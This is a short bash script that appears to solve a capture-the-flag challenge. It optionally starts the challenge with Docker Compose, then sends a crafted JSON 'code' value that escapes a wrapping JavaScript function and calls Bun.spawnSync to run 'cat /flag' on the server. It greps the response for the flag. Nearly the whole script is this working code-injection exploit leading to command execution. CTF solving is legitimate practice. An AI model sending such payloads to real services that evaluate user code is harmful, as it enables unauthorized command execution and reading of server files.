#!/bin/bash

if [ -n "$1" ]; then
    HOST="$1"
else
    HOST="http://localhost:3000/"
    RUN_DOCKER=1
fi

if [ -n "$RUN_DOCKER" ]; then
    docker compose build
    docker compose up -d
    sleep 5
fi

# })(),
# (()=>{return Bun.spawnSync(['cat', '/flag']).stdout
curl -s -d $'{"code":"})(),(()=>{return Bun.spawnSync([\'cat\', \'/flag\']).stdout"}' "${HOST}run" | egrep -o 'flag{.*?}'

if [ -n "$RUN_DOCKER" ]; then
  docker compose down
fi
